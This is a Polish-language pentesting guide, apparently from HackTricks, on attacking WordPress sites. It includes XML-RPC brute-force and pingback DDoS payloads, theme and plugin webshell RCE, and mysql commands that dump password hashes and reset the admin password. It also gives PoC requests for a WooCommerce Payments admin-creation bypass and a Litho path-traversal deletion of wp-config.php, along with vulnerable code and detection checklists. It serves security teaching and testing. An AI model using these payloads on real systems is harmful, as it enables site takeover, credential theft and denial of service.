# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **PrzesÅ‚ane** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Pliki motywÃ³w znajdujÄ… siÄ™ w /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie uÅ¼yjesz tej Å›cieÅ¼ki. Na przykÅ‚ad: UÅ¼ywajÄ…c **theme twentytwelve** moÅ¼esz **dostÄ™powaÄ‡** do pliku **404.php** w: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Inny przydatny adres moÅ¼e byÄ‡:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o root do bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest uÅ¼ywany podczas procesu aktywacji przez email przy zakÅ‚adaniu nowej strony WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik bÄ™dÄ…cy funkcjÄ… WordPress, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych z HTTP jako mechanizmem transportu i XML jako mechanizmem kodowania. Ten typ komunikacji zostaÅ‚ zastÄ…piony przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` jest gÅ‚Ã³wnym katalogiem, w ktÃ³rym przechowywane sÄ… pluginy i motywy.
- `wp-content/uploads/` to katalog, w ktÃ³rym przechowywane sÄ… wszystkie pliki przesÅ‚ane na platformÄ™.
- `wp-includes/` to katalog, w ktÃ³rym przechowywane sÄ… pliki core, takie jak certyfikaty, czcionki, pliki JavaScript i widgety.
- `wp-sitemap.xml` W wersjach Wordpress 5.5 i nowszych, Wordpress generuje plik sitemap XML ze wszystkimi publicznymi wpisami oraz publicznie zapytalnymi typami wpisÃ³w i taksonomiami.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniania i salts oraz prefiks tabel bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼yty do aktywacji trybu DEBUG, co moÅ¼e byÄ‡ przydatne w rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Editor**: Publikuje i zarzÄ…dza swoimi oraz cudzymi wpisami
- **Author**: Publikuje i zarzÄ…dza wÅ‚asnymi wpisami
- **Contributor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
- **Subscriber**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Passive Enumeration**

### **SprawdÅº wersjÄ™ WordPress**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

WewnÄ…trz **kod ÅºrÃ³dÅ‚owy** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### OgÃ³lne wyodrÄ™bnianie wersji
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Plugins and Themes

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich Plugins i Themes. Aby odkryÄ‡ wszystkie, bÄ™dziesz musiaÅ‚(a) **aktywnie Brute Force listÄ™ Plugins i Themes** (na szczÄ™Å›cie istniejÄ… zautomatyzowane narzÄ™dzia, ktÃ³re zawierajÄ… takie listy).

### UÅ¼ytkownicy

- **ID Brute:** Otrzymujesz prawidÅ‚owych uÅ¼ytkownikÃ³w z serwisu WordPress poprzez Brute Forcing identyfikatorÃ³w uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi majÄ… status **200** lub **30X**, oznacza to, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº ma status **400**, to id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz takÅ¼e prÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, zapytujÄ…c:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Inny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZwrÃ³Ä‡ uwagÄ™, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone zostanÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

ZwrÃ³Ä‡ teÅ¼ uwagÄ™, Å¼e **/wp-json/wp/v2/pages** moÅ¼e leak IP addresses.

- **Login username enumeration**: Podczas logowania przez **`/wp-login.php`** **komunikat** jest **inny** i wskazuje, czy podany **username** istnieje, czy nie.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼esz przeprowadziÄ‡ credentials brute-force lub uÅ¼yÄ‡ go do uruchomienia DoS attacks na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces[ using this](https://github.com/relarizky/wpxploit) na przykÅ‚ad).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**PoÅ›wiadczenia Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** sÄ… niektÃ³rymi z metod, ktÃ³re moÅ¼na wykorzystaÄ‡ do brute-force poÅ›wiadczeÅ„. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi ze statusem 200 powinien siÄ™ pojawiÄ‡, jeÅ›li poÅ›wiadczenia sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c poprawnych poÅ›wiadczeÅ„ moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Ta metoda jest przeznaczona dla programÃ³w, nie dla ludzi, i jest stara â€” w zwiÄ…zku z tym nie obsÅ‚uguje 2FA. JeÅ›li wiÄ™c masz valid creds, ale gÅ‚Ã³wny dostÄ™p jest chroniony 2FA, **moÅ¼esz byÄ‡ w stanie wykorzystaÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi creds, omijajÄ…c 2FA**. ZwrÃ³Ä‡ uwagÄ™, Å¼e nie bÄ™dziesz mÃ³gÅ‚ wykonaÄ‡ wszystkich akcji dostÄ™pnych z poziomu konsoli, ale nadal moÅ¼esz dojÅ›Ä‡ do RCE, jak wyjaÅ›nia Ippsec w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** z wartoÅ›ciÄ… **wiÄ™kszÄ…** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody i spowodowaÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu gÅ‚Ã³wnym strony Wordpress: **`/wp-cron.php`**\
Gdy ten plik zostanie **accessed**, wykonywane jest "**heavy**" zapytanie MySQL (**query**), wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **attackers** do spowodowania **DoS**.\
DomyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem gdy klient Å¼Ä…da dowolnej strony Wordpress), co na serwisach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego cronjob na hoÅ›cie, ktÃ³ry bÄ™dzie wykonywaÅ‚ potrzebne akcje w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ a strona Worpress moÅ¼e wykonaÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, a jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## Automatyczne narzÄ™dzia
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostÄ™p przez nadpisanie bitu

To bardziej ciekawostka niÅ¼ prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o odwrÃ³ciÄ‡ 1 bit w dowolnym pliku wordpress. MoÅ¼na byÅ‚o wiÄ™c odwrÃ³ciÄ‡ pozycjÄ™ `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zastÄ…piÄ‡ operacjÄ™ NOT (`!`) instrukcjÄ… NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z uÅ¼ywanego motywu (potrzebne dane logowania admina)**

WyglÄ…d â†’ Edytor motywÃ³w â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do tej zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskaÄ‡ sesjÄ™.

## RCE przez wtyczkÄ™

### Wtyczka PHP

MoÅ¼liwe, Å¼e da siÄ™ przesÅ‚aÄ‡ pliki .php jako wtyczkÄ™.  
UtwÃ³rz swÃ³j php backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowÄ… wtyczkÄ™:

![](<../../images/image (722).png>)

PrzeÅ›lij wtyczkÄ™ i naciÅ›nij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie to pozornie nic nie zrobi, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

OtwÃ³rz go, a zobaczysz URL do uruchomienia reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na instalacji zÅ‚oÅ›liwej wtyczki, o ktÃ³rej wiadomo, Å¼e jest podatna i ktÃ³rÄ… moÅ¼na wykorzystaÄ‡ do uzyskania web shella. Proces przeprowadza siÄ™ przez dashboard WordPress w nastÄ™pujÄ…cy sposÃ³b:

1. **Plugin Acquisition**: wtyczka jest pobierana ze ÅºrÃ³dÅ‚a takiego jak Exploit DB jak [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- PrzejdÅº do panelu WordPress, nastÄ™pnie do `Dashboard > Plugins > Upload Plugin`.
- PrzeÅ›lij plik zip pobranej wtyczki.
3. **Plugin Activation**: Po pomyÅ›lnej instalacji wtyczkÄ™ naleÅ¼y aktywowaÄ‡ przez dashboard.
4. **Exploitation**:
- Po zainstalowaniu i aktywowaniu wtyczki "reflex-gallery" moÅ¼na jÄ… wykorzystaÄ‡, poniewaÅ¼ jest znana z bycia podatnÄ….
- Metasploit framework udostÄ™pnia exploit dla tej podatnoÅ›ci. ZaÅ‚adowanie odpowiedniego moduÅ‚u i wykonanie specyficznych poleceÅ„ pozwala uzyskaÄ‡ sesjÄ™ meterpreter, dajÄ…c nieautoryzowany dostÄ™p do serwisu.
- NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e to tylko jedna z wielu metod wykorzystania strony WordPress.

TreÅ›Ä‡ zawiera materiaÅ‚y wizualne przedstawiajÄ…ce kroki w dashboard WordPress dotyczÄ…ce instalacji i aktywacji wtyczki. Jednak waÅ¼ne jest, aby zaznaczyÄ‡, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i jedynie w kontekÅ›cie prawnym, takich jak testy penetracyjne z wyraÅºnÄ… zgodÄ….

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ to skrypt zaprojektowany do eskalacji podatnoÅ›ci **Cross-Site Scripting (XSS)** do **Remote Code Execution (RCE)** lub innych krytycznych podatnoÅ›ci w WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Zapewnia **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Tworzy uÅ¼ytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ PrzeÅ›lij wÅ‚asnÄ… wtyczkÄ™ (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuj wbudowanÄ… wtyczkÄ™ w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuj wbudowany motyw w WordPress.
- _**(Custom) Custom Exploits:**_ WÅ‚asne exploity dla third-party WordPress Plugins/Themes.

## Post Exploitation

WydobÄ…dÅº nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Powierzchnia ataku

Zrozumienie, w jaki sposÃ³b wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowe do odnalezienia podatnoÅ›ci w jej dziaÅ‚aniu. MoÅ¼esz zobaczyÄ‡, w jaki sposÃ³b wtyczka moÅ¼e ujawniaÄ‡ funkcje w poniÅ¼szych punktach oraz znaleÅºÄ‡ kilka przykÅ‚adÃ³w podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje uÅ¼ytkownikom, sÄ… obsÅ‚ugi AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy w logice, autoryzacji lub uwierzytelnianiu. Co wiÄ™cej, doÅ›Ä‡ czÄ™sto te funkcje opierajÄ… zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu wordpress nonce, ktÃ³re **kaÅ¼dy uÅ¼ytkownik zalogowany w instancji Wordpress moÅ¼e posiadaÄ‡** (niezaleÅ¼nie od roli).

Oto funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do udostÄ™pnienia funkcji we wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Co wiÄ™cej, jeÅ›li funkcja jedynie sprawdza autoryzacjÄ™ uÅ¼ytkownika za pomocÄ… funkcji `wp_verify_nonce`, ta funkcja tylko sprawdza, czy uÅ¼ytkownik jest zalogowany â€” zwykle nie weryfikuje roli uÅ¼ytkownika. W zwiÄ…zku z tym uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do operacji wymagajÄ…cych wyÅ¼szych uprawnieÅ„.

- **REST API**

MoÅ¼liwe jest rÃ³wnieÅ¼ udostÄ™pnienie funkcji z wordpressa przez zarejestrowanie REST API za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` to callback do funkcji, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest uprawniony do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼yta zostanie wbudowana funkcja `__return_true`, po prostu pominie ona sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku php**

OczywiÅ›cie Wordpress uÅ¼ywa PHP, a pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z sieci. JeÅ›li wtyczka udostÄ™pnia podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest wywoÅ‚ywana jedynie przez dostÄ™p do pliku, bÄ™dzie ona moÅ¼liwa do wykorzystania przez kaÅ¼dego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re wtyczki implementujÄ… skrÃ³ty "trusted header" dla integracji wewnÄ™trznych lub reverse proxies i nastÄ™pnie uÅ¼ywajÄ… tego headera do ustawienia aktualnego kontekstu uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li header nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent upstream, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i trafiÄ‡ na uprzywilejowane REST route'y jako administrator.

- WpÅ‚yw: eskalacja uprawnieÅ„ bez uwierzytelnienia do roli administratora przez utworzenie nowego administratora za pomocÄ… core users REST route.
- PrzykÅ‚adowy header: `X-Wcpay-Platform-Checkout-User: 1` (wymusza user ID 1, zazwyczaj pierwsze konto administratora).
- Wykorzystywana Å›cieÅ¼ka: `POST /wp-json/wp/v2/users` z tablicÄ… z podwyÅ¼szonÄ… rolÄ….

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to dziaÅ‚a

- Wtyczka mapuje nagÅ‚Ã³wek kontrolowany przez klienta na stan uwierzytelnienia i pomija sprawdzanie uprawnieÅ„.
- WordPress core oczekuje uprawnienia `create_users` dla tej Å›cieÅ¼ki; hack wtyczki omija to przez bezpoÅ›rednie ustawienie kontekstu bieÅ¼Ä…cego uÅ¼ytkownika na podstawie nagÅ‚Ã³wka.

Oczekiwane wskaÅºniki sukcesu

- HTTP 201 z ciaÅ‚em JSON opisujÄ…cym utworzonego uÅ¼ytkownika.
- Nowy uÅ¼ytkownik z uprawnieniami administratora widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kÄ…tem uprzywilejowanych callbackÃ³w, ktÃ³re nie majÄ… solidnych sprawdzeÅ„ `permission_callback` i zamiast tego polegajÄ… na nagÅ‚Ã³wkach Å¼Ä…dania.
- Szukaj uÅ¼yÄ‡ funkcji zarzÄ…dzania uÅ¼ytkownikami rdzenia (`wp_insert_user`, `wp_create_user`) wewnÄ…trz handlerÃ³w REST, ktÃ³re sÄ… zabezpieczone jedynie przez wartoÅ›ci nagÅ‚Ã³wkÃ³w.

### Nieautoryzowane dowolne usuwanie plikÃ³w przez wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **Unauthenticated access** â€“ the `wp_ajax_nopriv_` hook is registered.
* **No nonce / capability check** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e wywoÅ‚aÄ‡ endpoint.
* **No path sanitisation** â€“ ciÄ…g kontrolowany przez uÅ¼ytkownika `fontfamily` jest konkatenowany do filesystem path bez filtrowania, co pozwala na klasyczny `../../` traversal.

#### Eksploatacja

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej katalogu bazowego uploads** (zazwyczaj `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c jedno Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
PoniewaÅ¼ `wp-config.php` znajduje siÄ™ poza *uploads*, cztery sekwencje `../` wystarczÄ… w domyÅ›lnej instalacji. UsuniÄ™cie `wp-config.php` wymusza na WordPress uruchomienie *kreatora instalacji* przy nastÄ™pnej wizycie, umoÅ¼liwiajÄ…c peÅ‚ne przejÄ™cie serwisu (atakujÄ…cy jedynie dostarcza nowÄ… konfiguracjÄ™ DB i tworzy konto admina).

Inne istotne cele to pliki `.php` w pluginach/motywach (aby zÅ‚amaÄ‡ security plugins) lub reguÅ‚y `.htaccess`.

#### Lista kontrolna wykrywania

* KaÅ¼de wywoÅ‚anie zwrotne `add_action( 'wp_ajax_nopriv_...')`, ktÃ³re wywoÅ‚uje helpery systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itp.).
* ÅÄ…czenie niesanitizowanych danych wejÅ›ciowych uÅ¼ytkownika w Å›cieÅ¼ki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

---

### Eskalacja uprawnieÅ„ przez przywracanie przestarzaÅ‚ych rÃ³l i brak autoryzacji (ASE "View Admin as Role")

Wiele pluginÃ³w implementuje funkcjÄ™ "view as role" lub tymczasowej zmiany roli poprzez zapisanie oryginalnej(ych) roli(i) w user meta, aby mÃ³c je przywrÃ³ciÄ‡ pÃ³Åºniej. JeÅ›li Å›cieÅ¼ka przywracania opiera siÄ™ jedynie na parametrach Å¼Ä…dania (np. `$_REQUEST['reset-for']`) i liÅ›cie utrzymywanej przez wtyczkÄ™ bez sprawdzania uprawnieÅ„ i waÅ¼nego nonce, staje siÄ™ to wertykalnÄ… eskalacjÄ… uprawnieÅ„.

PrzykÅ‚ad z rzeczywistego Å›wiata znaleziono we wtyczce Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). GaÅ‚Ä…Åº resetu przywracaÅ‚a role na podstawie `reset-for=<username>` jeÅ›li nazwa uÅ¼ytkownika pojawiÅ‚a siÄ™ w wewnÄ™trznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonywaÅ‚a ani sprawdzenia `current_user_can()` ani weryfikacji nonce przed usuniÄ™ciem obecnych rÃ³l i ponownym dodaniem zapisanych rÃ³l z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego jest to eksploatowalne

- Polega na zaufaniu do `$_REQUEST['reset-for']` i opcji wtyczki bez autoryzacji po stronie serwera.
